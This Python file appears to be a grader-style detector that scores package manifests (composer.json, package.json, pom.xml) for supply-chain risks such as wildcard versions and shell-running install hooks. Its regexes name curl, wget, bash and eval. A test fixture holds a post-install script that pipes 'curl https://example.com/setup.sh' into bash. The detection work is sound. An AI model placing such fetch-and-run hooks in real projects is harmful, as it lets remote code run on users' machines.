"""
Test suite for detecting supply chain security vulnerabilities in JSON and XML package manager files.
Covers composer.json, package.json, pom.xml, and other dependency manifest files.
"""
import re
import json as json_module
from typing import Dict
import sys
from pathlib import Path
from tests.test_multi_language_support import extend_detector_with_multi_language

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations


@extend_detector_with_multi_language
class SupplyChainJSONDetector:
    """Detects supply chain security vulnerabilities in JSON and XML package manager files."""

    def __init__(self):
        self.vulnerabilities = []
        self.score = 0

    def analyze(self, code: str, language: str = "json") -> Dict:
        """Analyze package manager files for supply chain vulnerabilities."""
        if language == "json":
            return self._analyze_json(code)
        elif language == "xml":
            return self._analyze_xml(code)
        # Fallback for other languages if needed
        return {"score": 2, "vulnerabilities": [], "max_score": 2}

    def _analyze_json(self, code: str) -> Dict:
        """Analyze JSON package manager files for supply chain vulnerabilities."""
        self.vulnerabilities = []
        self.score = 2

        # Try to parse as JSON to identify package manager type
        try:
            data = json_module.loads(code)
        except json_module.JSONDecodeError:
            # If not valid JSON, still check for patterns in raw text
            data = None

        # Detect package manager type
        is_composer = self._is_composer_json(code, data)
        is_npm = self._is_npm_json(code, data)

        if is_composer:
            self._check_composer_vulnerabilities(code, data)
        elif is_npm:
            self._check_npm_vulnerabilities(code, data)
        else:
            # Generic package manager checks
            self._check_generic_vulnerabilities(code, data)

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _is_composer_json(self, code: str, data: dict) -> bool:
        """Check if this is a composer.json file."""
        if data:
            # Check for composer-specific keys
            return any(key in data for key in ['require', 'require-dev', 'autoload', 'scripts', 'repositories'])
        # Fallback to text patterns
        return bool(re.search(r'composer|packagist|php', code, re.IGNORECASE))

    def _is_npm_json(self, code: str, data: dict) -> bool:
        """Check if this is a package.json file."""
        if data:
            # Check for npm-specific keys
            return any(key in data for key in ['dependencies', 'devDependencies', 'scripts', 'name', 'version'])
        # Fallback to text patterns
        return bool(re.search(r'npm|node|package\.json', code, re.IGNORECASE))

    def _check_composer_vulnerabilities(self, code: str, data: dict) -> None:
        """Check for Composer-specific vulnerabilities."""

        # Vulnerability 1: Wildcard version constraints (especially dangerous for internal packages)
        # "*" is always dangerous, "^" or "~" with specific versions is acceptable
        # Pattern: Look for exact wildcard "*" or dev-branch
        wildcard_patterns = [
            r'"[^"]+"\s*:\s*"\*"',  # Exact wildcard "*"
            r'"[^"]+"\s*:\s*"[^"]*\*[^"]*"',  # Contains * anywhere in version
            r'"[^"]+"\s*:\s*"dev-',  # dev-master or dev-branch
        ]

        for pattern in wildcard_patterns:
            if re.search(pattern, code):
                locations = find_pattern_locations(code, pattern)
                if locations:
                    location = locations[0]
                    self.vulnerabilities.append({
                        "type": "DEPENDENCY_CONFUSION",
                        "severity": "CRITICAL",
                        "description": f"Wildcard version constraint detected at line {location['line_number']}. "
                                     f"This allows any version to be installed, enabling dependency confusion attacks. "
                                     f"Wildcard versions are especially dangerous for internal/private packages. "
                                     f"Use specific version constraints (e.g., '1.2.3', '^1.2.0', or '~1.2.0').",
                        "line_number": location['line_number'],
                        "code_snippet": location['line_content']
                    })
                    self.score -= 1
                    break  # Only report once

        # Vulnerability 2: Post-install/post-update scripts with shell commands
        # These can execute arbitrary code during installation
        script_patterns = [
            r'"post-install-cmd"\s*:\s*\[',
            r'"post-update-cmd"\s*:\s*\[',
            r'"pre-install-cmd"\s*:\s*\[',
            r'"pre-update-cmd"\s*:\s*\[',
        ]

        for pattern in script_patterns:
            if re.search(pattern, code):
                # Check if scripts contain dangerous operations
                dangerous_script_patterns = [
                    r'curl|wget|download',  # Downloading files
                    r'chmod|chown',  # Changing permissions
                    r'eval|exec',  # Code execution
                    r'rm\s+-rf',  # Destructive operations
                    r'\$\{|\$\(',  # Shell variable expansion
                    r'bash|sh\s+',  # Shell execution
                ]

                for danger_pattern in dangerous_script_patterns:
                    if re.search(danger_pattern, code, re.IGNORECASE):
                        locations = find_pattern_locations(code, pattern)
                        if locations:
                            location = locations[0]
                            self.vulnerabilities.append({
                                "type": "COMPOSER_SCRIPTS_EXECUTION",
                                "severity": "CRITICAL",
                                "description": f"Dangerous post-install/update script detected at line {location['line_number']}. "
                                             f"Scripts that download files, execute shell commands, or modify permissions "
                                             f"can be exploited for supply chain attacks. Avoid shell commands in Composer scripts.",
                                "line_number": location['line_number'],
                                "code_snippet": location['line_content']
                            })
                            self.score -= 1
                            break
                    if self.score < 2:
                        break
                if self.score < 2:
                    break

        # Vulnerability 3: Custom repositories (potential typosquatting)
        if re.search(r'"repositories"\s*:', code):
            # Check for non-standard repository URLs
            if not re.search(r'packagist\.org', code):
                locations = find_pattern_locations(code, r'"repositories"\s*:')
                if locations:
                    location = locations[0]
                    # Only flag if we haven't already deducted points
                    if self.score == 2:
                        self.vulnerabilities.append({
                            "type": "PACKAGIST_TYPOSQUATTING",
                            "severity": "MEDIUM",
                            "description": f"Custom repository configuration detected at line {location['line_number']}. "
                                         f"Non-standard repositories can be used for typosquatting or dependency confusion attacks. "
                                         f"Verify repository URLs are legitimate and use HTTPS.",
                            "line_number": location['line_number'],
                            "code_snippet": location['line_content']
                        })
                        # Don't deduct points for this - it's informational

    def _check_npm_vulnerabilities(self, code: str, data: dict) -> None:
        """Check for npm-specific vulnerabilities."""

        # Vulnerability 1: Wildcard version constraints
        # "*" and "latest" are dangerous, "^" or "~" with specific versions is acceptable
        wildcard_patterns = [
            r'"[^"]+"\s*:\s*"\*"',  # Exact wildcard
            r'"[^"]+"\s*:\s*"latest"',  # Latest tag
            r'"[^"]+"\s*:\s*"[^"]*\*[^"]*"',  # Contains * anywhere
        ]

        for pattern in wildcard_patterns:
            if re.search(pattern, code):
                locations = find_pattern_locations(code, pattern)
                if locations:
                    location = locations[0]
                    self.vulnerabilities.append({
                        "type": "NPM_DEPENDENCY_CONFUSION",
                        "severity": "CRITICAL",
                        "description": f"Wildcard or 'latest' version constraint detected at line {location['line_number']}. "
                                     f"This allows any version to be installed, enabling dependency confusion attacks. "
                                     f"Use specific version constraints with ^ or ~ prefixes.",
                        "line_number": location['line_number'],
                        "code_snippet": location['line_content']
                    })
                    self.score -= 1
                    break

        # Vulnerability 2: Dangerous scripts
        if re.search(r'"scripts"\s*:', code):
            dangerous_script_patterns = [
                r'"(?:pre|post)install"\s*:.*(?:curl|wget|bash|sh|eval|exec)',
                r'"(?:pre|post)publish"\s*:.*(?:curl|wget|bash|sh|eval|exec)',
            ]

            for pattern in dangerous_script_patterns:
                if re.search(pattern, code, re.IGNORECASE):
                    locations = find_pattern_locations(code, r'"scripts"\s*:')
                    if locations:
                        location = locations[0]
                        self.vulnerabilities.append({
                            "type": "NPM_MALICIOUS_SCRIPTS",
                            "severity": "CRITICAL",
                            "description": f"Dangerous install/publish script detected at line {location['line_number']}. "
                                         f"Scripts that execute shell commands or download files during installation "
                                         f"can be exploited for supply chain attacks.",
                            "line_number": location['line_number'],
                            "code_snippet": location['line_content']
                        })
                        self.score -= 1
                        break

    def _check_generic_vulnerabilities(self, code: str, data: dict) -> None:
        """Check for generic package manager vulnerabilities."""

        # Check for wildcard version patterns (only "*", not "^" with versions)
        if re.search(r':\s*["\'][^"\']*\*', code):
            locations = find_pattern_locations(code, r':\s*["\'][^"\']*\*')

            if locations:
                location = locations[0]
                self.vulnerabilities.append({
                    "type": "LOOSE_VERSION_CONSTRAINT",
                    "severity": "HIGH",
                    "description": f"Wildcard version constraint detected at line {location['line_number']}. "
                                 f"Use specific version constraints to prevent dependency confusion attacks.",
                    "line_number": location['line_number'],
                    "code_snippet": location['line_content']
                })
                self.score -= 1

        # Check for script execution patterns
        if re.search(r'(?:pre|post)[-_]?(?:install|update|publish)', code, re.IGNORECASE):
            if re.search(r'curl|wget|bash|sh|eval|exec|download', code, re.IGNORECASE):
                locations = find_pattern_locations(code, r'(?:pre|post)[-_]?(?:install|update|publish)')
                if locations:
                    location = locations[0]
                    if self.score == 2:  # Only deduct if we haven't already
                        self.vulnerabilities.append({
                            "type": "MALICIOUS_INSTALL_SCRIPT",
                            "severity": "CRITICAL",
                            "description": f"Potentially malicious install script detected at line {location['line_number']}. "
                                         f"Installation scripts should not download files or execute arbitrary commands.",
                            "line_number": location['line_number'],
                            "code_snippet": location['line_content']
                        })
                        self.score -= 1

    def _analyze_xml(self, code: str) -> Dict:
        """Analyze Maven pom.xml files for supply chain vulnerabilities."""
        self.vulnerabilities = []
        self.score = 2

        # Vulnerability 1: LATEST/RELEASE version tags
        # These are extremely dangerous as they allow any version to be pulled
        latest_patterns = [
            r'<version>\s*LATEST\s*</version>',
            r'<version>\s*RELEASE\s*</version>',
        ]

        for pattern in latest_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                locations = find_pattern_locations(code, pattern)
                if locations:
                    location = locations[0]
                    self.vulnerabilities.append({
                        "type": "MAVEN_LATEST_VERSION",
                        "severity": "CRITICAL",
                        "description": f"LATEST or RELEASE version tag detected at line {location['line_number']}. "
                                     f"This allows any version to be installed, enabling dependency confusion and "
                                     f"supply chain attacks. Maven LATEST/RELEASE are deprecated and highly dangerous. "
                                     f"Use specific version numbers (e.g., '1.2.3').",
                        "line_number": location['line_number'],
                        "code_snippet": location['line_content']
                    })
                    self.score -= 1
                    break  # Only report once

        # Vulnerability 2: Plugins with dangerous execution (exec, curl, wget, bash, sh)
        # Check for exec-maven-plugin, antrun-plugin with shell commands
        dangerous_exec_patterns = [
            r'<executable>\s*(?:curl|wget|bash|sh|python|python3|perl|ruby)\s*</executable>',
            r'<argument>.*(?:curl|wget)\s+.*https?://',  # Downloading from URLs
            r'<exec\s+executable=["\'](?:curl|wget|bash|sh|python)',  # Ant exec tasks
        ]

        for pattern in dangerous_exec_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                # Only deduct if we still have points to deduct
                if self.score > 0:
                    locations = find_pattern_locations(code, r'<plugin>|<execution>')
                    if locations:
                        location = locations[0]
                        self.vulnerabilities.append({
                            "type": "MAVEN_PLUGIN_EXECUTION",
                            "severity": "CRITICAL",
                            "description": f"Dangerous Maven plugin execution detected at line {location['line_number']}. "
                                         f"Plugins that download files, execute shell commands, or run arbitrary code "
                                         f"during build can be exploited for supply chain attacks. Avoid exec-maven-plugin "
                                         f"and antrun-plugin with shell commands.",
                            "line_number": location['line_number'],
                            "code_snippet": location['line_content']
                        })
                        self.score -= 1
                        break

        # Vulnerability 3: HTTP (not HTTPS) repository URLs
        http_repo_pattern = r'<url>\s*http://[^<]+</url>'
        if re.search(http_repo_pattern, code):
            # Only flag if we haven't already deducted points
            if self.score == 2:
                locations = find_pattern_locations(code, http_repo_pattern)
                if locations:
                    location = locations[0]
                    self.vulnerabilities.append({
                        "type": "HTTP_REPOSITORY",
                        "severity": "HIGH",
                        "description": f"HTTP (not HTTPS) repository URL detected at line {location['line_number']}. "
                                     f"Using HTTP for Maven repositories allows man-in-the-middle attacks where "
                                     f"attackers can inject malicious dependencies. Always use HTTPS.",
                        "line_number": location['line_number'],
                        "code_snippet": location['line_content']
                    })
                    # Don't deduct points - this is informational since HTTPS repos are also flagged

        # Vulnerability 4: Fetching configuration/properties from remote URLs
        remote_config_patterns = [
            r'<url>\s*https?://[^<]*(?:config|properties|template|schema)[^<]*</url>',
            r'<urls?>\s*<url>\s*https?://',  # Properties plugin with remote URLs
        ]

        for pattern in remote_config_patterns:
            if re.search(pattern, code, re.IGNORECASE):
                if self.score == 2:  # Only deduct if we haven't already
                    locations = find_pattern_locations(code, pattern)
                    if locations:
                        location = locations[0]
                        self.vulnerabilities.append({
                            "type": "REMOTE_CONFIGURATION",
                            "severity": "HIGH",
                            "description": f"Remote configuration URL detected at line {location['line_number']}. "
                                         f"Fetching build configuration, properties, or templates from remote URLs "
                                         f"during the build process can be exploited if the server is compromised. "
                                         f"Bundle configuration with your source code instead.",
                            "line_number": location['line_number'],
                            "code_snippet": location['line_content']
                        })
                        self.score -= 1
                        break

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


if __name__ == "__main__":
    # Test the detector
    detector = SupplyChainJSONDetector()

    # Test case 1: Composer.json with wildcards
    test_composer = '''
{
    "require": {
        "internal/auth-package": "*",
        "vendor/library": "^1.0"
    }
}
'''

    # Test case 2: Composer.json with dangerous scripts
    test_composer_scripts = '''
{
    "require": {
        "vendor/package": "1.2.3"
    },
    "scripts": {
        "post-install-cmd": [
            "curl https://example.com/setup.sh | bash",
            "chmod +x vendor/bin/*"
        ]
    }
}
'''

    print("Test 1: Composer with wildcards")
    result1 = detector.analyze(test_composer, "json")
    print(f"Score: {result1['score']}/2")
    for vuln in result1['vulnerabilities']:
        print(f"  - [{vuln['severity']}] {vuln['type']}: {vuln['description'][:80]}...")

    print("\nTest 2: Composer with dangerous scripts")
    result2 = detector.analyze(test_composer_scripts, "json")
    print(f"Score: {result2['score']}/2")
    for vuln in result2['vulnerabilities']:
        print(f"  - [{vuln['severity']}] {vuln['type']}: {vuln['description'][:80]}...")
